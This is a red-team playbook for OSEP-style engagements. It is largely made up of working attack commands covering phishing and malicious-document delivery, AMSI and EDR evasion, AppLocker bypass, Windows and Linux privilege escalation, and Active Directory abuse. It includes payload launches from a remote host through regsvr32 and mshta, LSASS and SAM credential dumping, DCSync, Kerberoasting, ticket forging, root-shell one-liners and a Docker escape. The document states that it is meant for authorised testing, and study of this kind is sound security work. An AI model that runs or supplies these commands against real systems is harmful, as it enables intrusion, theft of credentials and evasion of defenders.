# OSEP Practitioner Playbook

> Personal reference for OSEP-style engagements: advanced enumeration, client-side initial access, AV/EDR evasion, application allow-listing bypass, lateral movement, Active Directory abuse, and Linux post-exploitation. Organised by attack-chain stage rather than by tool. Calibrated for red-teamers who already hold OSCP-level fundamentals.

**Author:** Krishnendu De (`@Krishcalin`)
**Status:** Living document
**Scope:** Lab and authorised engagement use only.

---

## Table of contents

1. [Operating principles](#1-operating-principles)
2. [Reconnaissance and enumeration](#2-reconnaissance-and-enumeration)
3. [Client-side initial access](#3-client-side-initial-access)
4. [AV and EDR evasion](#4-av-and-edr-evasion)
5. [Application allow-listing bypass](#5-application-allow-listing-bypass-applocker--wdac)
6. [Tunnelling and pivoting](#6-tunnelling-and-pivoting)
7. [Windows privilege escalation](#7-windows-privilege-escalation)
8. [Credential access](#8-credential-access)
9. [Lateral movement](#9-lateral-movement)
10. [Active Directory abuse](#10-active-directory-abuse)
11. [Linux post-exploitation](#11-linux-post-exploitation)
12. [Persistence](#12-persistence)
13. [Kiosk and constrained-shell breakouts](#13-kiosk-and-constrained-shell-breakouts)
14. [OPSEC and telemetry awareness](#14-opsec-and-telemetry-awareness)
15. [Appendix: References and tool index](#15-appendix-references-and-tool-index)

---

## 1. Operating principles

A few rules I keep visible while working:

- **Enumerate before exploiting.** Most failed OSEP attempts trace back to missed services, missed shares, or missed accounts — not missing exploits.
- **Stay quiet by default.** Treat the engagement as monitored. Loud tools (`mimikatz.exe sekurlsa::logonpasswords`, `psexec.exe`, raw `nmap -A` at full speed across a /16) burn the assessment.
- **Use the smallest payload that gets the job done.** A single PowerShell one-liner is cleaner than a 2 MB C2 implant if all you need is a one-off recon command.
- **Document as you go.** Capture screenshots, command-line invocations and output hashes at the moment of execution. Reconstructing them later is painful and error-prone.
- **Know the artefact you create.** Every action leaves something — a 4624, a 4688, a Sysmon 1, an AMSI event 1100, an EDR child-process alert. If you can't name the artefact, you can't predict the blue-team response.

---

## 2. Reconnaissance and enumeration

### 2.1 External network sweep

Start broad, then narrow. The right `nmap` invocation depends on whether you care more about coverage or speed.

| Goal | Command pattern |
|---|---|
| Full-port TCP discovery, low noise | `nmap -p- -sS -T3 -Pn -n <target> -oA scans/<host>-tcp-full` |
| Same, but faster (rate-limited) | `sudo nmap -p- --min-rate 2000 --max-retries 1 -T4 -Pn -n <target> -oA scans/<host>-tcp-fast` |
| Service and version detection on found ports | `nmap -sV -sC -p <ports> <target> -oA scans/<host>-svc` |
| UDP top-100 (UDP is slow; never run `-p-`) | `sudo nmap -sU --top-ports 100 -T4 -Pn <target> -oA scans/<host>-udp` |
| OS guess + default scripts (loud) | `nmap -A -p <ports> <target> -oA scans/<host>-A` |

Practitioner notes:

- `-Pn` skips host discovery — necessary against most modern firewalled targets that drop ICMP.
- `-n` skips reverse DNS, which speeds things up and reduces DNS traffic that the blue team will see.
- Save **all three** output formats (`-oA`) early. `gnmap` (`.gnmap`) is the easiest to grep; `xml` feeds tools like Eyewitness and `searchsploit`.
- If the target rate-limits or tarpits, drop `--min-rate` and add `--scan-delay`. `nmap` will misreport port state under aggressive timing.

### 2.2 Service-specific enumeration

Once you have a port list, the per-service deep-dive matters more than the initial scan.

**SMB (445, 139):**
```bash
nxc smb <target> -u '' -p '' --shares          # null-session shares
nxc smb <target> -u guest -p '' --shares       # guest sessions
nxc smb <target> -u <user> -p <pass> --shares  # authenticated
nxc smb <target> -u <user> -p <pass> --rid-brute
smbclient -N -L //<target>/
enum4linux-ng -A <target>
```

**LDAP (389, 636, 3268):**
```bash
ldapsearch -x -H ldap://<dc> -b "DC=corp,DC=local"          # anon bind
nxc ldap <dc> -u <user> -p <pass> --users --groups
windapsearch.py --dc-ip <dc> -u <user>@<domain> -p <pass> -U
```

**Kerberos (88):**
```bash
nxc smb <dc> --users                                          # via SMB to get user list
GetNPUsers.py <domain>/ -dc-ip <dc> -usersfile users.txt -no-pass  # AS-REP roast
kerbrute_linux_amd64 userenum --dc <dc> -d <domain> users.txt      # user existence
```

**Web (80, 443, 8080, 8443):**
```bash
gobuster dir -u https://<target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
ffuf -w wordlist:FUZZ -u https://<target>/FUZZ -mc 200,301,302,403
nikto -h https://<target>
whatweb <target>
```

**RPC (135 + dynamic):**
```bash
impacket-rpcdump <target>
impacket-rpcmap ncacn_ip_tcp:<target>
```

**MSSQL (1433):**
```bash
nxc mssql <target> -u <user> -p <pass>
impacket-mssqlclient <user>:<pass>@<target> -windows-auth
```

### 2.3 DNS and subdomain enumeration

```bash
dig axfr @<ns> <domain>                         # zone transfer (rarely works, always try)
dnsrecon -d <domain> -t axfr
amass enum -passive -d <domain>
subfinder -d <domain> -all -recursive
```

### 2.4 OSINT for pretext development

Phishing succeeds on context, not cleverness. Before writing a lure, you should know:

- Who reports to whom (LinkedIn, leaked org charts)
- The corporate email format (`hunter.io`, `phonebook.cz`, breached-data sites)
- Internal jargon and team names (LinkedIn job posts often leak SCCM/Intune/Defender/CrowdStrike tenant details)
- Vendor relationships — supplier impersonation outperforms cold-email lures consistently
- Recent corporate events worth referencing (acquisitions, product launches, town halls)

---

## 3. Client-side initial access

The OSEP threat model assumes external perimeter is hardened; you land via a user. Three vector families matter:

### 3.1 Phishing infrastructure

- **Domain selection.** Aged domains (>30 days) clear most reputation filters. Avoid typosquats — most modern filters score them. Prefer plausible but unrelated names with category-relevant TLDs.
- **Mail authentication.** SPF, DKIM and DMARC must all be aligned. Misaligned mail goes straight to junk in Microsoft 365.
- **TLS.** Free CA certs are fine; the lure URL must be HTTPS.
- **Tooling.** `evilginx3` for AiTM credential and session-cookie capture; `gophish` for spray-and-track; `mailoney`/`postal` for self-hosted SMTP.

### 3.2 Malicious documents

Modern Office blocks macros from Mark-of-the-Web sources by default, so initial-access vectors have shifted. Working patterns as of recent engagements:

- **HTML smuggling → ISO/IMG → LNK → loader.** The container strips MotW from the inner payload. LNK runs a small loader (PowerShell, .NET, or a custom EXE).
- **OneNote `.one` files with embedded objects.** Heavily abused 2023–2024; many EDRs now flag them, but they still work in less-mature environments.
- **Signed-binary proxy execution from a Word/Excel template.** Lures the user into clicking through a benign-looking document that side-loads via a `Document_Open` macro on a *templated* file pulled from a remote share.
- **PDF → URL → browser exploit / credential harvest.** When document execution is locked down, fall back to credential-capture pages reached via a benign PDF.

Macro hardening to defeat:

- Block macros from internet zone — bypass with container delivery as above.
- ASR rule `Block Office applications from creating child processes` — defeat with in-process loaders (no `cmd.exe`/`powershell.exe` spawn).
- ASR rule `Block Win32 API calls from Office macros` — defeat by moving execution to .NET via XLL or COM.

### 3.3 Alternative initial-access vectors

- **Malicious browser extensions.** Quietly effective against organisations without managed-extension policies.
- **Watering-hole on supplier sites.** Higher effort; works where direct phishing is blocked at the gateway.
- **USB drop.** Still works in OT-adjacent environments. Use HID-emulating devices, not bare flash drives.

---

## 4. AV and EDR evasion

Treat AV bypass and EDR bypass as **separate problems** — signatures vs behaviour. A clean signature gets you past Defender on-disk scans; behavioural evasion is what gets you past CrowdStrike, SentinelOne, Defender for Endpoint or Carbon Black at runtime.

### 4.1 AMSI bypass families

AMSI is the choke point for PowerShell, VBA and JScript content scanning. Bypass categories:

1. **Patch `amsi.dll!AmsiScanBuffer` in-process** — overwrite the function prologue to return `AMSI_RESULT_CLEAN`. Heavily signatured; obfuscation lifetime is short.
2. **Force `amsiInitFailed = true`** on the `System.Management.Automation.AmsiUtils` type via reflection. Still works in older PowerShell builds; flagged by recent Defender signatures.
3. **Hardware-breakpoint hooks** that intercept the call without modifying memory. Cleaner against EDR memory scans but more involved.
4. **Run under an AMSI-free interpreter** — older PowerShell 2.0 if still available, or load .NET assemblies that bypass the script-scanning path entirely.

OPSEC: Defender logs Event 1100 (`AMSI provider failed`) on a sloppy patch. Verify your patch produces no event before relying on it.

### 4.2 PowerShell logging and Constrained Language Mode

- **Script block logging (Event 4104)** captures decoded content even after deobfuscation. The only defence is not running PowerShell where it's enabled — move to .NET via `System.Management.Automation` from a custom host, or to C# entirely.
- **Constrained Language Mode (CLM)** blocks .NET reflection from PowerShell. Bypasses: official PS host downgrade, custom runspace from a non-PS process, or porting the payload to compiled C#.

### 4.3 Process injection patterns

From quietest to loudest against modern EDR:

| Pattern | EDR detection profile |
|---|---|
| Module stomping into a benign loaded DLL | Low — no new memory regions |
| Thread hijacking + ROP gadget | Low–medium |
| Early-bird APC injection | Medium |
| `NtMapViewOfSection` + `RtlCreateUserThread` | Medium |
| Process hollowing | High |
| `CreateRemoteThread` + `VirtualAllocEx(RWX)` | Very high |

EDR products hook `ntdll.dll` user-mode functions. Common evasions:

- **Direct syscalls** (SysWhispers3, Hell's Gate, Halo's Gate) — call into the kernel from your own stub, bypassing the hook entirely. Detected by some products via call-stack inspection.
- **Indirect syscalls** — return to a legitimate `syscall;ret` gadget inside `ntdll`, restoring a normal call stack.
- **Unhooking** — refresh `ntdll` from disk or from a suspended process. Loud against modern EDR that watches for writes to `ntdll`.

### 4.4 Loader hygiene

- Strip PE metadata (timestamps, RICH headers, debug paths) before deploying.
- Use **PPID spoofing** so the loader appears parented under `explorer.exe` rather than `winword.exe`.
- Use **BlockDlls** (`PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON`) to keep EDR user-mode DLLs out of your child processes.
- **Sleep obfuscation** (Ekko, Foliage, Zilean) to encrypt your beacon's memory between callbacks. Defeats many memory-scanner detections.

---

## 5. Application allow-listing bypass (AppLocker / WDAC)

The strategy is the same regardless of product: find an execution primitive that the policy already trusts, and proxy your payload through it.

### 5.1 Recon

```powershell
Get-AppLockerPolicy -Effective -Xml | Out-File policy.xml
# Look for: default rules, signed-publisher allowances, path allowances,
# and any custom rules with overly broad scope.
```

### 5.2 LOLBAS-style execution primitives

The current canonical reference is **LOLBAS** (Living Off The Land Binaries, Scripts and Libraries). Categories worth memorising:

- **Trusted script hosts**: `mshta.exe`, `wscript.exe`, `cscript.exe`, `powershell.exe`
- **Compilers and interpreters**: `msbuild.exe`, `installutil.exe`, `regsvcs.exe`, `regasm.exe`, `jsc.exe`, `csc.exe`
- **Signed proxies**: `regsvr32.exe`, `rundll32.exe`, `odbcconf.exe`, `pcalua.exe`
- **WMI consumers**: `wmic.exe` (deprecated on Win11 but still present)
- **Office and admin tools**: `msdt.exe` (Follina), `dfsvc.exe`, `presentationhost.exe`

Defaults to test first:

```cmd
regsvr32.exe /s /n /u /i:http://<server>/file.sct scrobj.dll
mshta.exe http://<server>/payload.hta
msbuild.exe payload.csproj
```

### 5.3 Path-rule weaknesses

Default AppLocker rules trust `C:\Windows\` and `C:\Program Files\`. Hunt for sub-directories that are world-writeable:

```powershell
icacls C:\Windows\*  | findstr /i "everyone authenticated users"
# Common hits: C:\Windows\Tasks, C:\Windows\Temp, C:\Windows\Tracing,
# C:\Windows\System32\spool\drivers\color, and various tracing/perf directories.
```

Drop a signed loader binary or a renamed `powershell.exe` into a writeable trusted path; AppLocker path rules don't validate signatures unless the rule is publisher-based.

---

## 6. Tunnelling and pivoting

### 6.1 Modern preference order

1. **Ligolo-ng** — TUN-mode reverse tunnel. Routes the entire pentest VM through the compromised host as if it were a router. Best UX of any current tool for double/triple pivots.
2. **Chisel** — HTTP-tunneled SOCKS. Useful when only port 443 egresses.
3. **SSH** dynamic/local/remote forwards — when SSH is available either inbound or outbound.
4. **`sshuttle`** — quick VPN-like setup over SSH. Good for solo operator workflows.
5. **In-C2 SOCKS** (Cobalt Strike rportfwd, Sliver tcppivot, Mythic SOCKS) — when you're already inside a C2 framework.

### 6.2 Ligolo-ng minimal flow

On the attacker:
```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

On the target (after dropping the agent):
```bash
agent.exe -connect <attacker>:11601 -ignore-cert
```

In the proxy console:
```
» session
» ifconfig                  # discover internal interfaces on the pivot
» start --tun ligolo
sudo ip route add 10.10.10.0/24 dev ligolo
# Now scan/exploit the 10.10.10.0/24 segment directly from the attacker box.
```

### 6.3 Chisel reverse SOCKS

```bash
# Attacker
chisel server -p 8443 --reverse
# Target
chisel.exe client <attacker>:8443 R:1080:socks
# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains4 nxc smb 10.10.10.0/24 -u <user> -p <pass>
```

### 6.4 SSH forwards (quick reference)

```bash
ssh -D 1080 user@pivot                                   # dynamic SOCKS via pivot
ssh -L 8080:internal-web:80 user@pivot                   # local forward
ssh -R 4444:127.0.0.1:4444 user@attacker                 # reverse forward from pivot
sshuttle -r user@pivot 10.10.10.0/24                     # transparent VPN
```

---

## 7. Windows privilege escalation

### 7.1 Triage commands

```cmd
whoami /priv
whoami /groups
systeminfo
net user
net localgroup administrators
wmic qfe list brief
```

```powershell
# WinPEAS or PrivescCheck.ps1 for automated triage
.\winPEASx64.exe quiet cmd
. .\PrivescCheck.ps1; Invoke-PrivescCheck
```

### 7.2 Token-impersonation family (SeImpersonate / SeAssignPrimaryToken)

When a service account has `SeImpersonate`, the Potato family elevates to SYSTEM by coercing a privileged COM/RPC server into authenticating to a local listener and then impersonating the resulting token.

Variants in current use:

| Tool | Best fit |
|---|---|
| RoguePotato | Older builds; needs OXID resolver redirection |
| PrintSpoofer | Server 2016/2019 with Print Spooler running |
| GodPotato | Works across modern Windows including 2022; uses RPC + DCOM |
| EfsPotato / SharpEfsPotato | Uses MS-EFSR; one of the most reliable on patched 2022 |

Indicator that this family applies:
```cmd
whoami /priv | findstr /i SeImpersonate
```

### 7.3 Service misconfigurations

- **Unquoted service paths** with spaces — drop a binary at the truncation point.
- **Weak service binary ACLs** — replace the binary directly.
- **Weak service config ACLs** — `sc config <svc> binPath= "C:\Users\Public\me.exe"`.
- **DLL hijacking** — find a service or scheduled task that loads a DLL via search-order from a writeable location.

Triage:
```cmd
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
```

### 7.4 UAC bypass (when already a local admin in medium IL)

These move you from medium to high integrity without a UAC prompt. Useful for triggering `SeDebugPrivilege` on the elevated token.

- `fodhelper.exe` registry hijack via `HKCU:\Software\Classes\ms-settings\Shell\Open\command`
- `computerdefaults.exe` (same pattern)
- `eventvwr.exe` / `mmc.exe` snap-in handler hijacks (older builds)
- ICMLuaUtil COM elevation moniker

UAC bypasses are not privilege escalation — they're integrity-level escalation for an already-admin user.

### 7.5 Kernel exploits

Rarely required for OSEP-style targets, but worth knowing the canonical chain for older Server 2012/2016 hosts (`CVE-2020-0796`, `CVE-2021-1732`, `CVE-2022-21882`). On modern Server 2019/2022 with KASLR and SMEP/SMAP, focus on token-impersonation and misconfig paths instead.

---

## 8. Credential access

### 8.1 LSASS

Direct `mimikatz` against `lsass.exe` is detected by virtually every EDR. Modern quieter options:

- **`comsvcs.dll`** minidump: `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\l.dmp full`
- **`nanodump`** — handles PPL, can output to a non-MiniDump format and obfuscate the signature.
- **Direct-syscall dumpers** (e.g. custom tools using `NtReadVirtualMemory`) — avoid the `MiniDumpWriteDump` API path entirely.
- **PPLDump / PPLMedic** — for systems where LSA Protection (`RunAsPPL`) is enabled.

Offline parsing on the attacker:
```bash
pypykatz lsa minidump l.dmp
```

### 8.2 SAM and SYSTEM offline

```cmd
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
reg save HKLM\SECURITY C:\Temp\security.save
```

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

This yields local NTLM hashes, cached domain credentials (DCC2 / mscash2), and LSA secrets — including service account passwords stored in plaintext.

### 8.3 DPAPI

DPAPI protects browser saved passwords, Wi-Fi keys, Outlook passwords, RDP saved creds and many third-party app secrets. Two paths:

- **User masterkey** (decryptable with the user's password or NTLM hash)
- **Machine masterkey** (decryptable with the DPAPI machine key, recoverable from SYSTEM as SYSTEM)

Workflow with SharpDPAPI:
```
SharpDPAPI.exe masterkeys /password:<pass>
SharpDPAPI.exe credentials /pvk:<base64-pvk>
SharpDPAPI.exe blob /target:<file> /masterkey:<hex>
```

### 8.4 Kerberoasting and AS-REP roasting

```bash
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request -outputfile spns.hash
GetNPUsers.py <domain>/ -dc-ip <dc> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash

hashcat -m 13100 spns.hash rockyou.txt -r rules/best64.rule
hashcat -m 18200 asrep.hash rockyou.txt -r rules/best64.rule
```

Practitioner notes:
- AES-encrypted Kerberos tickets (etype 17/18) are much slower to crack than RC4. Request RC4 explicitly with `--request-user` if the account supports it.
- Targeted Kerberoasting works against any account *you* can write `servicePrincipalName` to via `GenericWrite` — see ACL abuses in section 10.

### 8.5 DCSync

Requires `Replicating Directory Changes` + `Replicating Directory Changes All`:

```bash
impacket-secretsdump <domain>/<user>:<pass>@<dc> -just-dc-user krbtgt
impacket-secretsdump <domain>/<user>:<pass>@<dc> -just-dc        # all
```

The `krbtgt` hash enables Golden Ticket forging (section 10.7).

---

## 9. Lateral movement

### 9.1 Built-in execution primitives

| Tool | Auth path | Default port | Artefact |
|---|---|---|---|
| `psexec` (Sysinternals) | NTLM/Kerberos via SMB | 445 | Service install, 7045 event |
| `wmiexec` (Impacket) | NTLM/Kerberos via DCOM/WMI | 135 + dynamic | WMI 5861 |
| `smbexec` (Impacket) | NTLM/Kerberos via SMB | 445 | Service install |
| `atexec` (Impacket) | NTLM/Kerberos via task scheduler | 445 | 4698 scheduled task |
| `evil-winrm` | NTLM/Kerberos via WinRM | 5985/5986 | 4624 type 3, WinRM logs |
| DCOM (MMC20.Application etc.) | Kerberos via DCOM | 135 + dynamic | DCOM 10000-series |

WinRM is typically the quietest of the bunch where it's available — it looks like normal admin traffic.

### 9.2 Pass-the-Hash, Overpass-the-Hash, Pass-the-Ticket

```bash
# Pass-the-Hash (NTLM relay-free, requires NTLM allowed)
nxc smb <target> -u <user> -H <ntlmhash> -d <domain>
impacket-psexec <domain>/<user>@<target> -hashes :<ntlmhash>

# Overpass-the-Hash (use NTLM hash to request a Kerberos TGT)
impacket-getTGT <domain>/<user> -hashes :<ntlmhash> -dc-ip <dc>
export KRB5CCNAME=$(pwd)/<user>.ccache
impacket-psexec -k -no-pass <domain>/<user>@<target>.<domain>

# Pass-the-Ticket
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=$(pwd)/ticket.ccache
```

### 9.3 NTLM relay

```bash
# Capture coercion-triggered authentication and relay to LDAP/SMB
impacket-ntlmrelayx -t ldaps://<dc> --escalate-user <controlled-account>
impacket-ntlmrelayx -t smb://<target> -smb2support --no-smb-server -socks
```

Coercion tools to pair with relay:
- `PetitPotam` (MS-EFSR)
- `Coercer` (multi-vector)
- `PrinterBug` / `SpoolSample` (MS-RPRN)
- `DFSCoerce` (MS-DFSNM)

Defences to be aware of: SMB signing required on the relay target blocks SMB relay; LDAP channel binding blocks LDAPS relay; EPA blocks HTTP-AD CS relay.

---

## 10. Active Directory abuse

### 10.1 Enumeration

BloodHound remains the spine of AD recon. Collection methods:

- **SharpHound (C#)** — most complete, runs on the target.
- **AzureHound** — for Entra ID tenants.
- **bloodhound.py (Python)** — runs from the attacker box over the network. Quieter against host-level EDR but still loud against AD logging.

```bash
bloodhound-python -d <domain> -u <user> -p <pass> -dc <dc> -c All
```

Useful Cypher queries beyond the defaults:
- Find Kerberoastable users with a path to Domain Admins
- Find users in groups owned via `GenericAll` from your foothold
- Find computers with unconstrained delegation
- Find sessions of Tier-0 admins on Tier-2 workstations

Complementary tools:
- `PowerView.ps1` — granular ad-hoc queries
- `ADSearch.exe` — LDAP from a beacon without loading .NET assemblies
- `ldeep` — local enumeration of a pre-pulled LDAP dump

### 10.2 ACL abuses

The high-value ACLs to hunt:

| ACL | Attack |
|---|---|
| `GenericAll` on user | Reset password, or set SPN and Kerberoast |
| `GenericWrite` on user | Set SPN (targeted Kerberoast), set `userAccountControl` to disable preauth (AS-REP roast) |
| `WriteDACL` on object | Grant yourself any other right |
| `WriteOwner` on object | Take ownership, then grant rights |
| `GenericAll` on computer | RBCD attack (section 10.5) or `msDS-KeyCredentialLink` shadow credentials |
| `AddSelf` / `WriteProperty` on group | Add yourself to the group |
| `ForceChangePassword` on user | Reset password without knowing the old one |

### 10.3 Unconstrained delegation

Compromise a computer with unconstrained delegation, coerce a DC to authenticate to it (`PetitPotam`, `printerbug`), and harvest the DC's TGT from memory.

```
# On compromised UC-delegated host
Rubeus.exe monitor /interval:1 /filteruser:<dc>$
# From attacker box
PetitPotam.py -u <user> -p <pass> -d <domain> <uc-host> <dc>
```

### 10.4 Constrained delegation (S4U2self / S4U2proxy)

If you control a service account configured for constrained delegation to a target service, you can impersonate any user to that service:

```
Rubeus.exe s4u /user:<service-account> /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target>.<domain> /ptt
```

### 10.5 Resource-Based Constrained Delegation (RBCD)

When you have `GenericAll`/`GenericWrite` on a computer account, you can set its `msDS-AllowedToActOnBehalfOfOtherIdentity` to a controlled computer account and impersonate any user to it:

```
# Create a fake machine account (default MachineAccountQuota=10)
impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'P@ssw0rd!' -dc-host <dc> '<domain>/<user>:<pass>'
# Set RBCD
rbcd.py -delegate-from 'FAKE$' -delegate-to '<target>$' -action write '<domain>/<user>:<pass>'
# Request impersonation ticket
impacket-getST -spn cifs/<target>.<domain> -impersonate Administrator '<domain>/FAKE$:P@ssw0rd!'
```

### 10.6 Shadow credentials (msDS-KeyCredentialLink)

If you have write access to a target's `msDS-KeyCredentialLink`, attach a certificate and authenticate as that account via PKINIT:

```
Whisker.exe add /target:<target>$ /domain:<domain> /dc:<dc>
Rubeus.exe asktgt /user:<target>$ /certificate:<base64-pfx> /password:<pfx-pass> /domain:<domain> /dc:<dc> /getcredentials
```

### 10.7 Golden, Silver, Diamond, Sapphire tickets

| Ticket | Requires | Forges | Detection |
|---|---|---|---|
| Golden | `krbtgt` hash | Any TGT in the domain | KRBTGT password rotation invalidates |
| Silver | Service account hash | Service tickets for that one service | Per-service; quieter than Golden |
| Diamond | `krbtgt` hash + real TGT | Modifies a real TGT in-flight | Harder to spot than Golden in 4769 patterns |
| Sapphire | `krbtgt` hash | Like Diamond but uses S4U for a fully realistic PAC | Currently the quietest of the family |

### 10.8 Cross-trust attacks

Forest trusts are not security boundaries the way domain trusts are. Worth checking on every engagement:

```
Get-DomainTrust
Get-ADTrust -Filter *
```

Attack patterns: SID History abuse across an external trust where SID filtering is off, trust-key extraction for inter-forest Golden Ticket equivalents, child-to-parent escalation via `SIDHistory` injection.

---

## 11. Linux post-exploitation

### 11.1 Initial recon

```bash
id
sudo -l
uname -a
cat /etc/os-release
hostname; hostname -I
ss -tulnp
ps -ef --forest
crontab -l; ls -la /etc/cron.* /var/spool/cron/crontabs/ 2>/dev/null
find / -perm -4000 -type f 2>/dev/null            # SUID
find / -perm -2000 -type f 2>/dev/null            # SGID
getcap -r / 2>/dev/null                            # capabilities
mount | grep -v 'proc\|sys'
```

Automated: `linpeas.sh`, `lse.sh`, `linux-smart-enumeration`.

### 11.2 SUID and capabilities

Cross-reference any findings with **GTFOBins**. Common abusable SUIDs/caps:

- `/usr/bin/find` with SUID → `find . -exec /bin/sh -p \;`
- `/usr/bin/python3` with `cap_setuid+ep` → `python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'`
- `/usr/bin/perl` with SUID → `perl -e 'exec "/bin/sh";'`
- `/usr/bin/env` with SUID → `env /bin/sh -p`

### 11.3 Sudo misconfigurations

```bash
sudo -l       # list user-allowed entries
```

Patterns to exploit:
- `NOPASSWD` on any GTFOBins entry — direct shell.
- Wildcards in allowed commands (e.g., `sudo /usr/bin/tar *`) — argument injection.
- `LD_PRELOAD` / `LD_LIBRARY_PATH` preserved via `env_keep` — load malicious shared object.
- `sudo` versions with CVEs (Baron Samedit `CVE-2021-3156` on older systems).

### 11.4 Kernel and Docker escapes

- `dirty pipe` (`CVE-2022-0847`) — Linux 5.8 → 5.16.11
- `pwnkit` (`CVE-2021-4034`) — almost all distros pre-2022
- Docker socket exposed in container → `docker run -v /:/host -it alpine chroot /host`
- Privileged container → mount host disk directly, or use `/dev/mem`.

### 11.5 Lateral movement on Linux

- SSH key reuse: dump `~/.ssh/`, `/etc/ssh/`, and `/root/.ssh/` and try keys across hosts.
- SSH agent forwarding hijack: `SSH_AUTH_SOCK` exposed when an admin is logged in lets you hop through.
- NFS exports with `no_root_squash` — mount, create a SUID root binary, execute.

---

## 12. Persistence

Persistence on a red-team engagement is more about **realism** than long-term survival. Pick mechanisms the assumed-adversary would use; avoid noisy persistence that breaks the engagement story.

| Mechanism | Detection profile |
|---|---|
| Registry Run / RunOnce | Trivial to find; useful as a tripwire only |
| Scheduled task (user) | Common; blends with admin tasks |
| Scheduled task (system, on-logon) | Common; check Task event log |
| Service install | High signal (7045); reserve for SYSTEM persistence |
| WMI event subscription | Quiet; surfaces in Sysmon 19/20/21 if enabled |
| COM hijacking | Quiet; user-context only |
| DLL search-order hijack on a benign app | Quiet but fragile |
| AD object-based (RBCD on a Tier-0 box, shadow creds on key accounts) | Survives endpoint reimaging |

---

## 13. Kiosk and constrained-shell breakouts

When you're dropped into a Citrix/RDP-published app, locked-down browser, or kiosk:

- **File dialogs.** `File > Open` in nearly any application yields an explorer-like view; right-click → "Open with…" → cmd/powershell.
- **Help system.** F1 in many apps opens an HTML viewer that resolves `mk:@MSITStore:` URIs or local file paths.
- **Print to file.** PDF/XPS printers expose path-traversal-able save dialogs.
- **Browser shortcuts.** `Ctrl+O`, `Ctrl+S` and `view-source:` are the classics. `javascript:` in the address bar may still work in older shells.
- **Office macro escape.** Locked-down Office still allows VBA in many kiosks. `Shell()` from VBA gives `cmd.exe`.
- **Sticky Keys / utilman.** Only relevant if you have offline disk access; for live kiosk breakout it's a dead end.

Citrix-specific:
- Published-app argument injection. `notepad.exe %*` published with a writeable arg passes through to a full notepad with file-dialog access.
- Drive mapping abuse. If client-drive mapping is enabled, you can write to a path the server side will execute.

---

## 14. OPSEC and telemetry awareness

A practitioner-level checklist of what each common action lights up:

| Action | Most-likely telemetry |
|---|---|
| `psexec.exe` style execution | 7045 Service Install, 4697, Sysmon 1, EDR named-pipe correlation |
| `wmiexec.py` | WMI-Activity 5857/5861, Sysmon 19/20/21 |
| `mimikatz.exe sekurlsa::logonpasswords` | Defender signature on `mimikatz`, EDR LSASS-handle alert (10/100x), AMSI |
| LSASS minidump via `comsvcs.dll` | EDR LSASS-handle alert, Sysmon 10, possibly 11 for file write |
| AS-REP roast (`GetNPUsers.py`) | 4768 with `Pre-Authentication Type: 0` — easy SIEM rule |
| Kerberoast (`GetUserSPNs.py`) | 4769 with encryption type 0x17 (RC4) for service tickets — high-fidelity rule when service uses AES |
| BloodHound SharpHound `-c All` | 4662 burst on AD, 4624/4625 spike, DC-side `Microsoft-Windows-LDAP-Client` |
| DCSync (`secretsdump -just-dc`) | 4662 with `DS-Replication-Get-Changes-All` GUID — gold-standard detection |
| `ntlmrelayx` SOCKS to LDAP | 4624 type 3 on the relay target, anomalous source IP for the account |
| AMSI bypass attempt | Defender event 1100, Script Block Logging 4104 |

If the engagement has a known SOC tooling stack, validate your evasion locally against the **same product version** before deploying. Defender baselines change every two-three weeks.

---

## 15. Appendix: References and tool index

Public references I keep bookmarked:

- **LOLBAS** — living off the land binaries on Windows (`lolbas-project.github.io`)
- **GTFOBins** — Linux equivalent (`gtfobins.github.io`)
- **MITRE ATT&CK** — technique IDs for report mapping (`attack.mitre.org`)
- **HackTricks** — broad technique reference (`book.hacktricks.wiki`)
- **The Hacker Recipes** — concise AD attack reference (`thehacker.recipes`)
- **Internal All The Things** — pentest cheat-sheets (`swisskyrepo.github.io`)
- **PayloadsAllTheThings** — payload patterns (`github.com/swisskyrepo`)
- **ired.team** — red-team techniques (`ired.team`)
- **ADSecurity.org** — AD attack research (Sean Metcalf)
- **SpecterOps blog** — modern AD and EDR research

Tooling I install on every operator VM:

- **Network / recon**: `nmap`, `masscan`, `naabu`, `ffuf`, `gobuster`, `nuclei`, `httpx`, `subfinder`, `amass`
- **AD / Windows**: `impacket`, `nxc` (NetExec), `BloodHound.py`, `kerbrute`, `evil-winrm`, `pypykatz`, `certipy`, `donpapi`
- **C2 / loaders**: per-engagement choice — Sliver, Mythic, Havoc, Cobalt Strike (licensed)
- **Tunneling**: `ligolo-ng`, `chisel`, `sshuttle`
- **Cracking**: `hashcat`, `john`, with `rockyou`, `hashes.org` and engagement-specific wordlists
- **Windows-side tooling** (compiled offline, not pulled from internet during engagement): `SharpHound`, `Rubeus`, `Seatbelt`, `SharpUp`, `SharpDPAPI`, `Whisker`, `SafetyKatz`, `nanodump`, `GodPotato`, `SharpEfsPotato`, `Certify`

---

*End of playbook v0.1. Roadmap: per-section command tables for printable cheat-sheets; an AppLocker policy review walk-through; an Entra ID / hybrid-identity section; a defender's eye-view companion document mapping each technique to recommended detections in Sentinel and Defender XDR.*
